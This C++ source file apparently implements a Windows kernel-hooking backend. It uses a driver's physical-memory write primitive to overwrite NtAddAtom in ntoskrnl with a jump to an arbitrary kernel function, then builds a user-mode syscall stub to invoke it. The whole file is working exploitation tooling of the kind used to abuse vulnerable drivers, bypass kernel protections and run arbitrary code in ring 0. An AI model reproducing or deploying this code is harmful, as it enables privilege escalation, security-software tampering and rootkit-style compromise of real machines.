#include "DriverFunctionBackend.h"

DriverFunctionBackend::DriverFunctionBackend(DriverInterface* pDriverInterface, SymbolHandler* pSymbolHandler) {
	this->pDriverInterface = pDriverInterface;
	this->pSymbolHandler = pSymbolHandler;

	this->CurrentFunctionPointer = NULL;
	BYTE tsyscall_execute[] = {
		0x49, 0x89, 0xCA,					// mov r10, rcx
		0xB8, 0x00, 0x00, 0x00, 0x00,		// mov eax, 000h
		0x0F, 0x05,							// syscall
		0xC3								// ret
	};

	memcpy(syscall_execute, tsyscall_execute, SyscallExecSize);
}

DWORD64 DriverFunctionBackend::GetKernelBaseAddress() {
	DWORD out = 0;
	DWORD nb = 0;
	PVOID* base = NULL;
	if (EnumDeviceDrivers(NULL, 0, &nb)) {
		base = (PVOID*)malloc(nb);
		if (EnumDeviceDrivers(base, nb, &out)) {
			return (DWORD64)base[0];
		}
	}
	return NULL;

}

bool DriverFunctionBackend::EnableHook() {
	// our hooking function is going to be NtAddAtom
	const std::wstring wsHookedFunction = L"NtAddAtom";
	const std::string sHookedFunction = "NtAddAtom";
	// first get the syscall number
	HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
	if (!hNtdll) return false;

	FARPROC NtAddAtomPtr = GetProcAddress(hNtdll, sHookedFunction.c_str());
	WORD syscall = *(WORD*)((DWORD64)NtAddAtomPtr + 0x4);
	memcpy(&syscall_execute[4], &syscall, sizeof(WORD));

	this->CurrentHookedFunctionPtr = pSymbolHandler->GetOffset(L"ntoskrnl.exe", wsHookedFunction);
	this->CurrentHookedFunctionPtr += this->GetKernelBaseAddress();

	if (!pDriverInterface->ReadMemory(this->CurrentHookedFunctionPtr, original_bytes, JumpHookSize))
		return false;

	return true;
}

DWORD64 DriverFunctionBackend::CreatePointer(LPCSTR FunctionName) {
	std::string sFunctionName = FunctionName;
	std::wstring wsFunctionName(sFunctionName.begin(), sFunctionName.end());
	DWORD64 FunctionOffset = this->pSymbolHandler->GetOffset(L"ntoskrnl.exe", wsFunctionName);
	DWORD64 FunctionAddress = FunctionOffset + this->GetKernelBaseAddress();

	return this->_CreatePointerFromArbitrarySystemSpaceFunctionPointer(FunctionAddress);
}

void DriverFunctionBackend::CleanupPointer() {
	if (!this->CurrentFunctionPointer) return;
	VirtualFree((LPVOID) this->CurrentFunctionPointer, NULL, MEM_RELEASE);

	this->CurrentFunctionPointer = NULL;
}

void DriverFunctionBackend::DisableHook() {
	pDriverInterface->PhysicalWrite(this->CurrentHookedFunctionPtr, original_bytes, JumpHookSize);
	this->CurrentHookedFunctionPtr = NULL;
	return;
}

DWORD64 DriverFunctionBackend::_CreatePointerFromArbitrarySystemSpaceFunctionPointer(DWORD64 SystemSpaceFunctionPointer) {
	if (!CurrentHookedFunctionPtr) return NULL;
	this->CurrentFunctionPointer = (DWORD64)VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_READWRITE);
	if (!this->CurrentFunctionPointer) return NULL;

	BYTE JumpHook[] = {
		0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	// mov rax, 0h <- to be memcpy'd later
		0xFF, 0xE0													// jmp rax
	};

	memcpy(&JumpHook[2], &SystemSpaceFunctionPointer, sizeof(DWORD64));

	if (!pDriverInterface->PhysicalWrite(this->CurrentHookedFunctionPtr, JumpHook, JumpHookSize))
		return NULL;

	memcpy((PVOID)this->CurrentFunctionPointer, syscall_execute, SyscallExecSize);

	DWORD oldProt;
	VirtualProtect((PVOID)this->CurrentFunctionPointer, SyscallExecSize, PAGE_EXECUTE_READ, &oldProt);

	return this->CurrentFunctionPointer;
}